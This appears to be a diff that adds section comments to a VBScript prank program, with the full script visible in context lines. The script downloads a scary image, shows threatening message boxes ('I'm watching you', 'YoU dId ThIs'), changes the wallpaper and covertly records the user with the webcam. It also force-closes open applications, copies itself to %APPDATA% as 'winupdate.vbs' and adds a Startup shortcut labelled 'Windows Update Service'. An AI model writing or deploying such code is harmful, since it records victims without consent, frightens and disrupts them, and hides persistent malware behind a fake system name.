@@ -5,6 +5,7 @@ Dim oShell, oFSO, scriptPath, scaryImgUrl, scaryImgPath, psPath, bgUrl, bgPath
 Set oShell = CreateObject("WScript.Shell")
 Set oFSO = CreateObject("Scripting.FileSystemObject")
 
+' ========== 1. SHOW SCARY IMAGE ==========
 scaryImgUrl = "https://wallpapers.com/images/hd/scary-face-pictures-wtvdzqnwvit6n0te.jpg"
 scaryImgPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\scary-face.jpg"
 DownloadToFile scaryImgUrl, scaryImgPath
@@ -13,7 +14,10 @@ If oFSO.FileExists(scaryImgPath) Then
     WScript.Sleep 1800
 End If
 
+' ========== 2. CREEPY MSGBOX ==========
 MsgBox "I'm watching you", 16, "..."
+
+' ========== 3. CHANGING BACKGROUND ==========
 bgUrl = "https://wallpaperaccess.com/full/2332759.jpg"
 bgPath = oShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\wallpaper.jpg"
 psPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\setwp.ps1"
@@ -49,6 +53,7 @@ End If
 
 WScript.Sleep 1000
 
+' ========== 4. CAMERA: open, record, play result ==========
 oShell.Run "explorer.exe microsoft.windows.camera:", 1, False
 WScript.Sleep 2500
 oShell.AppActivate "Camera"
@@ -58,6 +63,7 @@ WScript.Sleep 5000
 oShell.SendKeys " "
 WScript.Sleep 2000
 
+' ========== 5. Find and open newest video ==========
 Dim photoPath, folder, file, newestFile, newestDate
 photoPath = oShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\Camera Roll"
 newestDate = #1/1/1900#
@@ -79,8 +85,10 @@ End If
 
 WScript.Sleep 5000
 
+' ========== 6. "You look beautiful" ==========
 MsgBox "you look. . . beautiful.", 64, "..."
 
+' ========== 7. Minimize and close all user apps, including explorer, camera, video apps ==========
 WScript.Sleep 2000
 oShell.SendKeys "^{ESC}": WScript.Sleep 200
 oShell.SendKeys "^{ESC}": WScript.Sleep 500
@@ -94,7 +102,10 @@ Next
 
 WScript.Sleep 900
 
+' ========== 8. Final scary message ==========
 MsgBox "YoU dId ThIs", 16, "The End"
+
+' ========== 9. Self-copy & Startup shortcut ==========
 scriptPath = WScript.ScriptFullName
 Dim copyTo, shortcutPath, ws, startupFldr
 copyTo = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\winupdate.vbs"
@@ -111,8 +122,10 @@ shortcut.WindowStyle = 1
 shortcut.Description = "Windows Update Service"
 shortcut.Save
 
+' ========== 10. Play LOUD YouTube sound ==========
 oShell.Run "https://www.youtube.com/watch?v=7iUiVa2tfFo", 1, False
 
+' ======= DownloadToFile FUNCTION ==========
 Sub DownloadToFile(url, path)
     On Error Resume Next
     Dim x, s
